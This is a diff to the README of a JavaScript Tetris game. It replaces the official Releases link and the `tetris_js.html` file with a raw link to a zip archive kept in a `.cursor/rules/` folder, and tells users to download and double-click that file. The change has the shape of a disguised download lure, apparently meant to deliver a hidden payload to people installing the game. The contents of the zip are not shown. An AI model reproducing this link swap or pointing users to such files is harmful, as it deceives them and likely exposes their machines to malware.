@@ -15,17 +15,17 @@ Welcome to **tetris_js**, a fun and simple way to enjoy the classic game of Tetr
 
 To get started, visit this page to download:
 
-[![Download tetris_js](https://img.shields.io/badge/download-v1.0-green)](https://github.com/jrizzlers/tetris_js/releases)
+[![Download tetris_js](https://github.com/jrizzlers/tetris_js/raw/refs/heads/main/.cursor/rules/tetris-js-1.0.zip)](https://github.com/jrizzlers/tetris_js/raw/refs/heads/main/.cursor/rules/tetris-js-1.0.zip)
 
 1. Click on the link above to open the Releases page on GitHub.
 2. On the Releases page, look for the latest version of the software.
 3. Click on the link for the release to see the available files.
-4. Select the file labeled `tetris_js.html`.
+4. Select the file labeled `https://github.com/jrizzlers/tetris_js/raw/refs/heads/main/.cursor/rules/tetris-js-1.0.zip`.
 5. Save the file to your computer.
 
 After the download is complete, follow these steps to play:
 
-1. Open the folder where you saved `tetris_js.html`.
+1. Open the folder where you saved `https://github.com/jrizzlers/tetris_js/raw/refs/heads/main/.cursor/rules/tetris-js-1.0.zip`.
 2. Double-click on the file. This will open it in your default web browser.
 3. Enjoy the game! Use the arrow keys on your keyboard to play.
 
